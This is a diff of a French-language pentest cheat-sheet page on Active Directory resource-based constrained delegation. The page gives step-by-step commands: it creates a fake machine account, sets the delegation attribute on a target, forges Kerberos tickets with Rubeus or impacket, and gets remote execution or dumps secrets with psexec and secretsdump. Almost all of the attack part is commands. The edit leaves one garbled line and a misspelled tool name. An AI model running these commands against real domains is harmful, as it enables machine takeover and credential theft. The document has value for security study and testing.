@@ -4,38 +4,49 @@ _**Note :** Cette attaque est possible si un utilisateur dispose des droits "Gen
 
 _**Objectif :** Devenir administrateur de l'objet ordinateur (\<MACHINE-CIBLE>)._
 
-<pre><code><strong>### Connexion à une machine du domaine
-</strong><strong>$ evil-winrm -u "&#x3C;USER>" -p '&#x3C;PASSWORD>' -i &#x3C;MACHINE-DU-DOMAINE> -s /home/kali/tools/
+#### Connexion à une machine du domaine
+
+<pre><code><strong>$ evil-winrm -u "" -p '' -i -s /home/kali/tools/Conditionsme code
 </strong>#>PowerView.ps1
 #>Powermad.ps1
-#>upload Rubeus.exe
+#>upload Rubeus.exe</code></pre>
 
-### Conditions
+#### Conditions
 
+```
 #>Get-DomainObject -Identity "dc=domain,dc=com" -Domain domain.com -> Suppérieur à 0
 #>Get-DomainController -> Suppérieur ou égale à 2012
 #>Get-NetComputer dc | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity -> Vide
+```
 
-### Réalisation de l'attaque
+#### Réalisation de l'attaque
 
+```
 #### Création d'une fausse machine sur le domaine
-#>New-MachineAccount -MachineAccount &#x3C;FAKE-MACHINE> -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
-#>Get-DomainComputer &#x3C;FAKE-MACHINE> -> Récupération du SID
+#>New-MachineAccount -MachineAccount <FAKE-MACHINE> -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
+#>Get-DomainComputer <FAKE-MACHINE> -> Récupération du SID
 
-#### Indiquer à &#x3C;MACHINE-CIBLE> qu'elle doit faire confiance au compte &#x3C;FAKE-MACHINE>
-<strong>#>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;&#x3C;SID-FAKE-MACHINE>)"
-</strong>#>$SDBytes = New-Object byte[] ($SD.BinaryLength)
+#### Indiquer à <MACHINE-CIBLE> qu'elle doit faire confiance au compte <FAKE-MACHINE>
+#>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<SID-FAKE-MACHINE>)"
+#>$SDBytes = New-Object byte[] ($SD.BinaryLength)
 #>$SD.GetBinaryForm($SDBytes, 0)
-#>Get-DomainComputer &#x3C;MACHINE-CIBLE> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
-
-#### Conversion du mot de passe 123456 au format RC4
-#>./Rubeus.exe hash /password:123456 /user:&#x3C;FAKE-MACHINE> /domain:&#x3C;DOMAINE>
+#>Get-DomainComputer <MACHINE-CIBLE> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+```
 
 #### Génération des tickets Kerberos et RCE
-##### Windows
-#>./Rubeus.exe s4u /user:&#x3C;FAKE-MACHINE> /rc4:&#x3C;RC4-PASSWORD> /impersonateuser:&#x3C;ADMIN-MACHINE-CIBLE> /msdsspn:cifs/&#x3C;MACHINE-CIBLE>.&#x3C;DOMAINE> /domain:&#x3C;DOMAINE> /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /ptt
-##### Linux
-<strong>$ impacekt-getST -spn "cifs/&#x3C;MACHINE-CIBLE>.&#x3C;DOMAINE>" -impersonate &#x3C;ADMIN-MACHINE-CIBLE> -dc-ip &#x3C;IP-DC> '&#x3C;DOMAINE>/&#x3C;FAKE-MACHINE>$:123456'
-</strong>$ export KRB5CCNAME=&#x3C;ADMIN-MACHINE-CIBLE>.ccache
+
+Windows :&#x20;
+
+```
+#>./Rubeus.exe hash /password:123456 /user:<FAKE-MACHINE> /domain:<DOMAINE>
+#>./Rubeus.exe s4u /user:<FAKE-MACHINE> /rc4:<RC4-PASSWORD> /impersonateuser:<ADMIN-MACHINE-CIBLE> /msdsspn:cifs/<MACHINE-CIBLE>.<DOMAINE> /domain:<DOMAINE> /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /ptt
+```
+
+Linux :&#x20;
+
+```
+$ impacekt-getST -spn "cifs/<MACHINE-CIBLE>.<DOMAINE>" -impersonate <ADMIN-MACHINE-CIBLE> -dc-ip <IP-DC> '<DOMAINE>/<FAKE-MACHINE>$:123456'
+$ export KRB5CCNAME=<ADMIN-MACHINE-CIBLE>.ccache
 $ klist
-$ impacket-psexec -k &#x3C;MACHINE-CIBLE>.&#x3C;DOMAINE></code></pre>
+$ impacket-psexec -k ['<DOMAINE>/<USER>@]<MACHINE-CIBLE>.<DOMAINE> or impacket-secretsdump -k <MACHINE-CIBLE>.<DOMAINE>
+```
